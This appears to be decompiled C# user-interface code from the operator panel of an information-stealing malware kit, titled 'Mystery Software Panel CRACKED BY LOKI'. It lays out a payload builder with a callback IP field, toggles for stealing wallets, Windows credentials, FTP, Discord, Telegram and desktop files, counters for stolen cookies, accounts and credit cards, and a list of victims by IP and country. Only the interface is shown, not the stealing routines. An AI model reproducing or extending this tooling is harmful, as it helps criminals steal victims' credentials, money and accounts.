			this.buildCreating.StyleManager = this.mainStyle;
			this.buildCreating.TabIndex = 50;
			this.buildCreating.Text = "Loading...";
			this.buildCreating.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.buildCreating.ThemeAuthor = "Narwin";
			this.buildCreating.ThemeName = "MetroDark";
			this.assemblySourceIDLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.assemblySourceIDLbl.Location = new global::System.Drawing.Point(320, 385);
			this.assemblySourceIDLbl.Name = "assemblySourceIDLbl";
			this.assemblySourceIDLbl.Size = new global::System.Drawing.Size(148, 23);
			this.assemblySourceIDLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.assemblySourceIDLbl.StyleManager = this.mainStyle;
			this.assemblySourceIDLbl.TabIndex = 48;
			this.assemblySourceIDLbl.Text = "Assembly SourceID:";
			this.assemblySourceIDLbl.ThemeAuthor = "Narwin";
			this.assemblySourceIDLbl.ThemeName = "MetroDark";
			this.assemblySourceID.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.assemblySourceID.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.assemblySourceID.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.assemblySourceID.ForeColor = global::System.Drawing.Color.FromArgb(170, 170, 170);
			this.assemblySourceID.Location = new global::System.Drawing.Point(320, 410);
			this.assemblySourceID.Name = "assemblySourceID";
			this.assemblySourceID.Size = new global::System.Drawing.Size(561, 22);
			this.assemblySourceID.TabIndex = 47;
			this.assemblySourceID.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.assemblyPlatformLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.assemblyPlatformLbl.Location = new global::System.Drawing.Point(320, 330);
			this.assemblyPlatformLbl.Name = "assemblyPlatformLbl";
			this.assemblyPlatformLbl.Size = new global::System.Drawing.Size(175, 23);
			this.assemblyPlatformLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.assemblyPlatformLbl.StyleManager = this.mainStyle;
			this.assemblyPlatformLbl.TabIndex = 46;
			this.assemblyPlatformLbl.Text = "Assembly .NET Platform:";
			this.assemblyPlatformLbl.ThemeAuthor = "Narwin";
			this.assemblyPlatformLbl.ThemeName = "MetroDark";
			this.assemblyPlatform.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.assemblyPlatform.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.assemblyPlatform.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.assemblyPlatform.ForeColor = global::System.Drawing.Color.FromArgb(170, 170, 170);
			this.assemblyPlatform.Location = new global::System.Drawing.Point(320, 355);
			this.assemblyPlatform.Name = "assemblyPlatform";
			this.assemblyPlatform.Size = new global::System.Drawing.Size(561, 22);
			this.assemblyPlatform.TabIndex = 45;
			this.assemblyPlatform.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.assemblyIconLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.assemblyIconLbl.Location = new global::System.Drawing.Point(320, 275);
			this.assemblyIconLbl.Name = "assemblyIconLbl";
			this.assemblyIconLbl.Size = new global::System.Drawing.Size(148, 23);
			this.assemblyIconLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.assemblyIconLbl.StyleManager = this.mainStyle;
			this.assemblyIconLbl.TabIndex = 44;
			this.assemblyIconLbl.Text = "Assembly Icon:";
			this.assemblyIconLbl.ThemeAuthor = "Narwin";
			this.assemblyIconLbl.ThemeName = "MetroDark";
			this.assemblyIcon.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.assemblyIcon.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.assemblyIcon.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.assemblyIcon.ForeColor = global::System.Drawing.Color.FromArgb(170, 170, 170);
			this.assemblyIcon.Location = new global::System.Drawing.Point(320, 300);
			this.assemblyIcon.Name = "assemblyIcon";
			this.assemblyIcon.ReadOnly = true;
			this.assemblyIcon.Size = new global::System.Drawing.Size(519, 22);
			this.assemblyIcon.TabIndex = 43;
			this.assemblyIcon.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.assemblyCopyrightLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.assemblyCopyrightLbl.Location = new global::System.Drawing.Point(320, 220);
			this.assemblyCopyrightLbl.Name = "assemblyCopyrightLbl";
			this.assemblyCopyrightLbl.Size = new global::System.Drawing.Size(148, 23);
			this.assemblyCopyrightLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.assemblyCopyrightLbl.StyleManager = this.mainStyle;
			this.assemblyCopyrightLbl.TabIndex = 42;
			this.assemblyCopyrightLbl.Text = "Assembly Copyright:";
			this.assemblyCopyrightLbl.ThemeAuthor = "Narwin";
			this.assemblyCopyrightLbl.ThemeName = "MetroDark";
			this.assemblyCopyright.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.assemblyCopyright.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.assemblyCopyright.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.assemblyCopyright.ForeColor = global::System.Drawing.Color.FromArgb(170, 170, 170);
			this.assemblyCopyright.Location = new global::System.Drawing.Point(320, 245);
			this.assemblyCopyright.Name = "assemblyCopyright";
			this.assemblyCopyright.Size = new global::System.Drawing.Size(561, 22);
			this.assemblyCopyright.TabIndex = 41;
			this.assemblyCopyright.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.assemblyVersionLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.assemblyVersionLbl.Location = new global::System.Drawing.Point(320, 165);
			this.assemblyVersionLbl.Name = "assemblyVersionLbl";
			this.assemblyVersionLbl.Size = new global::System.Drawing.Size(148, 23);
			this.assemblyVersionLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.assemblyVersionLbl.StyleManager = this.mainStyle;
			this.assemblyVersionLbl.TabIndex = 40;
			this.assemblyVersionLbl.Text = "Assembly Version:";
			this.assemblyVersionLbl.ThemeAuthor = "Narwin";
			this.assemblyVersionLbl.ThemeName = "MetroDark";
			this.assemblyVersion.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.assemblyVersion.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.assemblyVersion.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.assemblyVersion.ForeColor = global::System.Drawing.Color.FromArgb(170, 170, 170);
			this.assemblyVersion.Location = new global::System.Drawing.Point(320, 190);
			this.assemblyVersion.Name = "assemblyVersion";
			this.assemblyVersion.Size = new global::System.Drawing.Size(561, 22);
			this.assemblyVersion.TabIndex = 39;
			this.assemblyVersion.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.assemblyCompanyLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.assemblyCompanyLbl.Location = new global::System.Drawing.Point(320, 110);
			this.assemblyCompanyLbl.Name = "assemblyCompanyLbl";
			this.assemblyCompanyLbl.Size = new global::System.Drawing.Size(148, 23);
			this.assemblyCompanyLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.assemblyCompanyLbl.StyleManager = this.mainStyle;
			this.assemblyCompanyLbl.TabIndex = 38;
			this.assemblyCompanyLbl.Text = "Assembly Company:";
			this.assemblyCompanyLbl.ThemeAuthor = "Narwin";
			this.assemblyCompanyLbl.ThemeName = "MetroDark";
			this.assemblyCompany.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.assemblyCompany.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.assemblyCompany.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.assemblyCompany.ForeColor = global::System.Drawing.Color.FromArgb(170, 170, 170);
			this.assemblyCompany.Location = new global::System.Drawing.Point(320, 135);
			this.assemblyCompany.Name = "assemblyCompany";
			this.assemblyCompany.Size = new global::System.Drawing.Size(561, 22);
			this.assemblyCompany.TabIndex = 37;
			this.assemblyCompany.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.createBuildBtn.BackColor = global::System.Drawing.Color.FromArgb(35, 147, 195);
			this.createBuildBtn.FlatAppearance.BorderSize = 0;
			this.createBuildBtn.FlatStyle = global::System.Windows.Forms.FlatStyle.Popup;
			this.createBuildBtn.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.createBuildBtn.Location = new global::System.Drawing.Point(515, 490);
			this.createBuildBtn.Name = "createBuildBtn";
			this.createBuildBtn.Size = new global::System.Drawing.Size(172, 32);
			this.createBuildBtn.TabIndex = 36;
			this.createBuildBtn.Text = "Create Build";
			this.createBuildBtn.UseVisualStyleBackColor = false;
			this.assemblyDescriptionLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.assemblyDescriptionLbl.Location = new global::System.Drawing.Point(320, 55);
			this.assemblyDescriptionLbl.Name = "assemblyDescriptionLbl";
			this.assemblyDescriptionLbl.Size = new global::System.Drawing.Size(148, 23);
			this.assemblyDescriptionLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.assemblyDescriptionLbl.StyleManager = this.mainStyle;
			this.assemblyDescriptionLbl.TabIndex = 35;
			this.assemblyDescriptionLbl.Text = "Assembly Description:";
			this.assemblyDescriptionLbl.ThemeAuthor = "Narwin";
			this.assemblyDescriptionLbl.ThemeName = "MetroDark";
			this.assemblyDescription.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.assemblyDescription.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.assemblyDescription.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.assemblyDescription.ForeColor = global::System.Drawing.Color.FromArgb(170, 170, 170);
			this.assemblyDescription.Location = new global::System.Drawing.Point(320, 80);
			this.assemblyDescription.Name = "assemblyDescription";
			this.assemblyDescription.Size = new global::System.Drawing.Size(561, 22);
			this.assemblyDescription.TabIndex = 34;
			this.assemblyDescription.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.countryContextMenu.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.listOfFoldersToolStripMenuItem
			});
			this.countryContextMenu.Name = "countryContextMenu";
			this.countryContextMenu.Size = new global::System.Drawing.Size(132, 26);
			this.listOfFoldersToolStripMenuItem.Name = "listOfFoldersToolStripMenuItem";
			this.listOfFoldersToolStripMenuItem.Size = new global::System.Drawing.Size(131, 22);
			this.listOfFoldersToolStripMenuItem.Text = "List of logs";
			this.listOfFoldersToolStripMenuItem.Click += new global::System.EventHandler(this.ListOfFoldersToolStripMenuItem_Click);
			this.appTray.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("appTray.Icon");
			this.appTray.Text = "Mystery software";
			this.appTray.MouseClick += new global::System.Windows.Forms.MouseEventHandler(this.AppTray_MouseClick);
			this.trayButton.BackColor = global::System.Drawing.Color.FromArgb(35, 147, 195);
			this.trayButton.FlatAppearance.BorderSize = 0;
			this.trayButton.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.trayButton.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.trayButton.Location = new global::System.Drawing.Point(1043, 6);
			this.trayButton.Name = "trayButton";
			this.trayButton.Size = new global::System.Drawing.Size(79, 26);
			this.trayButton.TabIndex = 10;
			this.trayButton.Text = "Tray";
			this.trayButton.UseVisualStyleBackColor = false;
			this.trayButton.Click += new global::System.EventHandler(this.TrayButton_Click);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(10f, 20f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.Transparent;
			base.BackgroundColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			base.ClientSize = new global::System.Drawing.Size(1234, 670);
			base.Controls.Add(this.trayButton);
			base.Controls.Add(this.pagesTabControl);
			base.Controls.Add(this.mainControlBox);
			base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			this.MaximumSize = new global::System.Drawing.Size(1234, 670);
			this.MinimumSize = new global::System.Drawing.Size(1234, 670);
			base.Name = "MainView";
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			base.Style = global::MetroSet_UI.Design.Style.Dark;
			base.StyleManager = this.mainStyle;
			this.Text = "Mystery Software Panel CRACKED BY LOKI";
			base.TextColor = global::System.Drawing.Color.White;
			base.ThemeName = "MetroDark";
			this.pagesTabControl.ResumeLayout(false);
			this.profilePage.ResumeLayout(false);
			this.logsPage.ResumeLayout(false);
			((global::System.ComponentModel.ISupportInitialize)this.logsListView).EndInit();
			this.statsPage.ResumeLayout(false);
			this.winStoreCredMenu.ResumeLayout(false);
			this.worldMapPage.ResumeLayout(false);
			this.serverLogPage.ResumeLayout(false);
			this.buildSettingsPage.ResumeLayout(false);
			this.buildSettingsPage.PerformLayout();
			this.desktopExtContextMenu.ResumeLayout(false);
			this.domainSorterPage.ResumeLayout(false);
			this.domainSorterPage.PerformLayout();
			this.domainContextMenu.ResumeLayout(false);
			this.cookieConvertPage.ResumeLayout(false);
			this.builderPage.ResumeLayout(false);
			this.builderPage.PerformLayout();
			this.countryContextMenu.ResumeLayout(false);
			base.ResumeLayout(false);
		}

		// Token: 0x040000FA RID: 250
		private global::System.ComponentModel.IContainer components;

		// Token: 0x040000FB RID: 251
		private global::MetroSet_UI.Controls.MetroSetControlBox mainControlBox;

		// Token: 0x040000FC RID: 252
		private global::MetroSet_UI.Controls.MetroSetTabControl pagesTabControl;

		// Token: 0x040000FD RID: 253
		private global::MetroSet_UI.Child.MetroSetTabPage profilePage;

		// Token: 0x040000FE RID: 254
		private global::MetroSet_UI.Child.MetroSetTabPage logsPage;

		// Token: 0x040000FF RID: 255
		private global::MetroSet_UI.Child.MetroSetTabPage statsPage;

		// Token: 0x04000100 RID: 256
		private global::MetroSet_UI.StyleManager mainStyle;

		// Token: 0x04000101 RID: 257
		private global::BrightIdeasSoftware.OLVColumn OperationSystem;

		// Token: 0x04000102 RID: 258
		private global::BrightIdeasSoftware.OLVColumn Hardwares;

		// Token: 0x04000103 RID: 259
		private global::BrightIdeasSoftware.FastDataListView logsListView;

		// Token: 0x04000104 RID: 260
		private global::BrightIdeasSoftware.OLVColumn UserName;

		// Token: 0x04000105 RID: 261
		private global::BrightIdeasSoftware.OLVColumn HardwareID;

		// Token: 0x04000106 RID: 262
		private global::BrightIdeasSoftware.OLVColumn ClientIP;

		// Token: 0x04000107 RID: 263
		private global::BrightIdeasSoftware.OLVColumn Country;

		// Token: 0x04000108 RID: 264
		private global::BrightIdeasSoftware.OLVColumn SourceID;

		// Token: 0x04000109 RID: 265
		private global::BrightIdeasSoftware.OLVColumn LogTime;

		// Token: 0x0400010A RID: 266
		private global::BrightIdeasSoftware.OLVColumn ID;

		// Token: 0x0400010B RID: 267
		private global::System.Windows.Forms.Button clearBtn;

		// Token: 0x0400010C RID: 268
		private global::MetroSet_UI.Controls.MetroSetLabel metroSetLabel1;

		// Token: 0x0400010D RID: 269
		private global::System.Windows.Forms.ListBox top10CountriesLb;

		// Token: 0x0400010E RID: 270
		private global::MetroSet_UI.Controls.MetroSetDivider AccountDevider;

		// Token: 0x0400010F RID: 271
		private global::MetroSet_UI.Controls.MetroSetDivider RegisterDevider;

		// Token: 0x04000110 RID: 272
		private global::MetroSet_UI.Controls.MetroSetDivider ActivateDevider;

		// Token: 0x04000111 RID: 273
		private global::MetroSet_UI.Controls.MetroSetDivider LoginDevider;

		// Token: 0x04000112 RID: 274
		private global::MetroSet_UI.Controls.MetroSetLabel accountIDLbl;

		// Token: 0x04000113 RID: 275
		private global::MetroSet_UI.Controls.MetroSetLabel registerDateLbl;

		// Token: 0x04000114 RID: 276
		private global::MetroSet_UI.Controls.MetroSetLabel activateDateLbl;

		// Token: 0x04000115 RID: 277
		private global::MetroSet_UI.Controls.MetroSetLabel loginLbl;

		// Token: 0x04000116 RID: 278
		private global::MetroSet_UI.Controls.MetroSetDivider metroSetDivider1;

		// Token: 0x04000117 RID: 279
		private global::MetroSet_UI.Controls.MetroSetLabel switchLbl;

		// Token: 0x04000118 RID: 280
		private global::MetroSet_UI.Controls.MetroSetSwitch styleSwitcher;

		// Token: 0x04000119 RID: 281
		private global::MetroSet_UI.Controls.MetroSetLabel panelVersion;

		// Token: 0x0400011A RID: 282
		private global::MetroSet_UI.Controls.MetroSetDivider PanelDevider;

		// Token: 0x0400011B RID: 283
		private global::MetroSet_UI.Controls.MetroSetLabel panelLbl;

		// Token: 0x0400011C RID: 284
		private global::MetroSet_UI.Controls.MetroSetLabel accountID;

		// Token: 0x0400011D RID: 285
		private global::MetroSet_UI.Controls.MetroSetLabel RegisterDate;

		// Token: 0x0400011E RID: 286
		private global::MetroSet_UI.Controls.MetroSetLabel AccountLogin;

		// Token: 0x0400011F RID: 287
		private global::MetroSet_UI.Controls.MetroSetLabel ActivateDate;

		// Token: 0x04000120 RID: 288
		private global::MetroSet_UI.Child.MetroSetTabPage domainSorterPage;

		// Token: 0x04000121 RID: 289
		private global::MetroSet_UI.Child.MetroSetTabPage builderPage;

		// Token: 0x04000122 RID: 290
		private global::System.Windows.Forms.ContextMenuStrip countryContextMenu;

		// Token: 0x04000123 RID: 291
		private global::System.Windows.Forms.ToolStripMenuItem listOfFoldersToolStripMenuItem;

		// Token: 0x04000124 RID: 292
		private global::System.Windows.Forms.NotifyIcon appTray;

		// Token: 0x04000125 RID: 293
		private global::System.Windows.Forms.Button trayButton;

		// Token: 0x04000126 RID: 294
		private global::MetroSet_UI.Controls.MetroSetLabel totalCookies;

		// Token: 0x04000127 RID: 295
		private global::MetroSet_UI.Controls.MetroSetLabel totalCookiesLbl;

		// Token: 0x04000128 RID: 296
		private global::MetroSet_UI.Controls.MetroSetLabel totalAccounts;

		// Token: 0x04000129 RID: 297
		private global::MetroSet_UI.Controls.MetroSetLabel totalAccountsLbl;

		// Token: 0x0400012A RID: 298
		private global::MetroSet_UI.Controls.MetroSetLabel totalCrypto;

		// Token: 0x0400012B RID: 299
		private global::MetroSet_UI.Controls.MetroSetLabel totalCryptoLbl;

		// Token: 0x0400012C RID: 300
		private global::MetroSet_UI.Child.MetroSetTabPage serverLogPage;

		// Token: 0x0400012D RID: 301
		private global::System.Windows.Forms.ListBox serverLogs;

		// Token: 0x0400012E RID: 302
		private global::MetroSet_UI.Controls.MetroSetLabel totalWinStore;

		// Token: 0x0400012F RID: 303
		private global::MetroSet_UI.Controls.MetroSetLabel totalWinStoreLbl;

		// Token: 0x04000130 RID: 304
		private global::MetroSet_UI.Controls.MetroSetLabel totalFtps;

		// Token: 0x04000131 RID: 305
		private global::MetroSet_UI.Controls.MetroSetLabel totalFtpsLbl;

		// Token: 0x04000132 RID: 306
		private global::MetroSet_UI.Child.MetroSetTabPage cookieConvertPage;

		// Token: 0x04000133 RID: 307
		private global::MetroSet_UI.Child.MetroSetTabPage buildSettingsPage;

		// Token: 0x04000134 RID: 308
		private global::System.Windows.Forms.Button jsonBtn;

		// Token: 0x04000135 RID: 309
		private global::System.Windows.Forms.Button netScapeBtn;

		// Token: 0x04000136 RID: 310
		private global::MetroSet_UI.Controls.MetroSetLabel stealDesktopLbl;

		// Token: 0x04000137 RID: 311
		private global::MetroSet_UI.Controls.MetroSetLabel stealFTPsLbl;

		// Token: 0x04000138 RID: 312
		private global::MetroSet_UI.Controls.MetroSetLabel stealWinCredsLbl;

		// Token: 0x04000139 RID: 313
		private global::MetroSet_UI.Controls.MetroSetLabel stealWalletsLbl;

		// Token: 0x0400013A RID: 314
		private global::MetroSet_UI.Controls.MetroSetLabel stealLogsLbl;

		// Token: 0x0400013B RID: 315
		private global::System.Windows.Forms.Button addDesktopExtBtn;

		// Token: 0x0400013C RID: 316
		private global::System.Windows.Forms.ListBox desktopExtList;

		// Token: 0x0400013D RID: 317
		private global::System.Windows.Forms.TextBox desktopExtTb;

		// Token: 0x0400013E RID: 318
		private global::System.Windows.Forms.ContextMenuStrip desktopExtContextMenu;

		// Token: 0x0400013F RID: 319
		private global::System.Windows.Forms.ToolStripMenuItem deleteToolStripMenuItem;

		// Token: 0x04000140 RID: 320
		private global::MetroSet_UI.Controls.MetroSetCheckBox stealDesktop;

		// Token: 0x04000141 RID: 321
		private global::MetroSet_UI.Controls.MetroSetCheckBox stealFTPs;

		// Token: 0x04000142 RID: 322
		private global::MetroSet_UI.Controls.MetroSetCheckBox stealWinCreds;

		// Token: 0x04000143 RID: 323
		private global::MetroSet_UI.Controls.MetroSetCheckBox stealWallets;

		// Token: 0x04000144 RID: 324
		private global::MetroSet_UI.Controls.MetroSetCheckBox stealLogs;

		// Token: 0x04000145 RID: 325
		private global::System.Windows.Forms.ListBox domainsLb;

		// Token: 0x04000146 RID: 326
		private global::MetroSet_UI.Controls.MetroSetLabel pathToLogsLbl;

		// Token: 0x04000147 RID: 327
		private global::System.Windows.Forms.TextBox pathToLogs;

		// Token: 0x04000148 RID: 328
		private global::System.Windows.Forms.ContextMenuStrip domainContextMenu;

		// Token: 0x04000149 RID: 329
		private global::System.Windows.Forms.ToolStripMenuItem saveToolStripMenuItem;

		// Token: 0x0400014A RID: 330
		private global::System.Windows.Forms.TextBox accountFormatter;

		// Token: 0x0400014B RID: 331
		private global::MetroSet_UI.Controls.MetroSetLabel logsLoading;

		// Token: 0x0400014C RID: 332
		private global::MetroSet_UI.Controls.MetroSetLabel assemblySourceIDLbl;

		// Token: 0x0400014D RID: 333
		private global::System.Windows.Forms.TextBox assemblySourceID;

		// Token: 0x0400014E RID: 334
		private global::MetroSet_UI.Controls.MetroSetLabel assemblyPlatformLbl;

		// Token: 0x0400014F RID: 335
		private global::System.Windows.Forms.TextBox assemblyPlatform;

		// Token: 0x04000150 RID: 336
		private global::MetroSet_UI.Controls.MetroSetLabel assemblyIconLbl;

		// Token: 0x04000151 RID: 337
		private global::System.Windows.Forms.TextBox assemblyIcon;

		// Token: 0x04000152 RID: 338
		private global::MetroSet_UI.Controls.MetroSetLabel assemblyCopyrightLbl;

		// Token: 0x04000153 RID: 339
		private global::System.Windows.Forms.TextBox assemblyCopyright;

		// Token: 0x04000154 RID: 340
		private global::MetroSet_UI.Controls.MetroSetLabel assemblyVersionLbl;

		// Token: 0x04000155 RID: 341
		private global::System.Windows.Forms.TextBox assemblyVersion;

		// Token: 0x04000156 RID: 342
		private global::MetroSet_UI.Controls.MetroSetLabel assemblyCompanyLbl;

		// Token: 0x04000157 RID: 343
		private global::System.Windows.Forms.TextBox assemblyCompany;

		// Token: 0x04000158 RID: 344
		private global::System.Windows.Forms.Button createBuildBtn;

		// Token: 0x04000159 RID: 345
		private global::MetroSet_UI.Controls.MetroSetLabel assemblyDescriptionLbl;

		// Token: 0x0400015A RID: 346
		private global::System.Windows.Forms.TextBox assemblyDescription;

		// Token: 0x0400015B RID: 347
		private global::MetroSet_UI.Controls.MetroSetLabel buildCreating;

		// Token: 0x0400015C RID: 348
		private global::System.Windows.Forms.Button assemblyOpenIconBtn;

		// Token: 0x0400015D RID: 349
		private global::MetroSet_UI.Controls.MetroSetLabel assemblyIPLbl;

		// Token: 0x0400015E RID: 350
		private global::System.Windows.Forms.TextBox assemblyIP;

		// Token: 0x0400015F RID: 351
		private global::System.Windows.Forms.Button browserDirBtn;

		// Token: 0x04000160 RID: 352
		private global::System.Windows.Forms.TextBox domainFilter;

		// Token: 0x04000161 RID: 353
		private global::MetroSet_UI.Controls.MetroSetLabel accountFormatterLbl;

		// Token: 0x04000162 RID: 354
		private global::MetroSet_UI.Controls.MetroSetLabel domainFilterLbl;

		// Token: 0x04000163 RID: 355
		private global::MetroSet_UI.Controls.MetroSetDivider metroSetDivider2;

		// Token: 0x04000164 RID: 356
		private global::System.Windows.Forms.ContextMenuStrip winStoreCredMenu;

		// Token: 0x04000165 RID: 357
		private global::System.Windows.Forms.ToolStripMenuItem saveRDPToolStripMenuItem;

		// Token: 0x04000166 RID: 358
		private global::MetroSet_UI.Controls.MetroSetCheckBox stealDiscord;

		// Token: 0x04000167 RID: 359
		private global::MetroSet_UI.Controls.MetroSetLabel stealDiscordLbl;

		// Token: 0x04000168 RID: 360
		private global::MetroSet_UI.Controls.MetroSetCheckBox stealTelegram;

		// Token: 0x04000169 RID: 361
		private global::MetroSet_UI.Controls.MetroSetLabel stealTelegramLbl;

		// Token: 0x0400016A RID: 362
		private global::MetroSet_UI.Controls.MetroSetLabel totalRDP;

		// Token: 0x0400016B RID: 363
		private global::MetroSet_UI.Controls.MetroSetLabel totalRDPLbl;

		// Token: 0x0400016C RID: 364
		private global::MetroSet_UI.Controls.MetroSetLabel totalDesktopFiles;

		// Token: 0x0400016D RID: 365
		private global::MetroSet_UI.Controls.MetroSetLabel totalDesktopFilesLbl;

		// Token: 0x0400016E RID: 366
		private global::MetroSet_UI.Controls.MetroSetLabel totalDiscord;

		// Token: 0x0400016F RID: 367
		private global::MetroSet_UI.Controls.MetroSetLabel totalDiscordLbl;

		// Token: 0x04000170 RID: 368
		private global::MetroSet_UI.Controls.MetroSetLabel totalCreditCards;

		// Token: 0x04000171 RID: 369
		private global::MetroSet_UI.Controls.MetroSetLabel totalCreditCardsLbl;

		// Token: 0x04000172 RID: 370
		private global::MetroSet_UI.Controls.MetroSetLabel totalTelegram;

		// Token: 0x04000173 RID: 371
		private global::MetroSet_UI.Controls.MetroSetLabel totalTelegramLbl;

		// Token: 0x04000174 RID: 372
		private global::MetroSet_UI.Controls.MetroSetDivider metroSetDivider3;

		// Token: 0x04000175 RID: 373
		private global::MetroSet_UI.Child.MetroSetTabPage worldMapPage;

		// Token: 0x04000176 RID: 374
		private global::LiveCharts.WinForms.GeoMap geoMapStat;

		// Token: 0x04000177 RID: 375
		private global::BrightIdeasSoftware.OLVColumn Languages;
	}
}
